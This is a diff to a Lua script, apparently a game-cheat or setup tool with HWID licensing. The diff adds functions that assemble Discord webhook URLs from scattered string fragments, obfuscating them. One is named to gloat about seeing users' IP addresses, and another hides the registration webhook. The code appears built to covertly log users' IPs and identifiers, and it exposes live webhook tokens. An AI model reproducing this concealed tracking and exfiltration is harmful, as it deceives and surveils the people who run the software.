@@ -17,7 +17,8 @@
     Fuel_url = "https://raw.githubusercontent.com/CarloMagazoni/GRL_CustomSetups/main/Fuel.lua"
     --local Meme_url = "https://raw.githubusercontent.com/CarloMagazoni/GRL_CustomSetups/main/Fuel.lua"
     HWID_url = "https://drive.google.com/uc?export=download&id=1cyu6nJI51kgzuvWjGDoYIjN__B2GN_MY"
-    LOG_url= ICanSeeYourIPBastardsLMAO()
+    LOG_url = ICanSeeYourIPBastardsLMAO()
+    REG_url = IAMTIGIMOTHERFUCKER()
   end
 
   function ICanSeeYourIPBastardsLMAO()
@@ -35,6 +36,25 @@
     Encode[11] = "905925823876464741/"
     Encode[12] = "aIlSyfHvQdVIpccxjel"
     Encode[13] = "-ixNzCAaWxP9YysHlCTPCbKXx2ARSzdjBz3p498_u8GrIDOqe"
+    local Coder = "https"..Encode[1]..Encode[2]..Encode[3]..Encode[4]..Encode[5]..Encode[6]..Encode[7]..Encode[8]..Encode[9]..Encode[10]..Encode[11]..Encode[12]..Encode[13]
+    return Coder
+  end
+
+  function IAMTIGIMOTHERFUCKER()
+    local Encode = {}
+    Encode[1] = "://"
+    Encode[2] = "dis"
+    Encode[3] = "cord"
+    Encode[4] = ".com/"
+    Encode[5] = "a"
+    Encode[6] = "pi/"
+    Encode[7] = "we"
+    Encode[8] = "b"
+    Encode[9] = "hoo"
+    Encode[10] = "ks/"
+    Encode[11] = "905931123694129193/"
+    Encode[12] = "pbbDaBg7aTzfZRuNQyMrf"
+    Encode[13] = "o2IlAFZkvBtD9MBDRIEAR6wy3R2ksK_GqaRwc3pddBWd-45"
     local Coder = "https"..Encode[1]..Encode[2]..Encode[3]..Encode[4]..Encode[5]..Encode[6]..Encode[7]..Encode[8]..Encode[9]..Encode[10]..Encode[11]..Encode[12]..Encode[13]
     return Coder
   end
@@ -110,7 +130,6 @@
   end
 
   function RegisterNewUser(ID)
-    local REG_url = "https://discord.com/api/webhooks/895454130242453504/wxBXG1UNwjXTXlqFW7AcQRV9LvW2vgouDlnSXMQ7pzBm4hwFq3r7gyONLC6mmvvahy-V"
     local DiscordNick = inputQuery('Enter your discord nickname#xxxx','','')
     if DiscordNick ~= nil then
       local REG_http = getInternet()
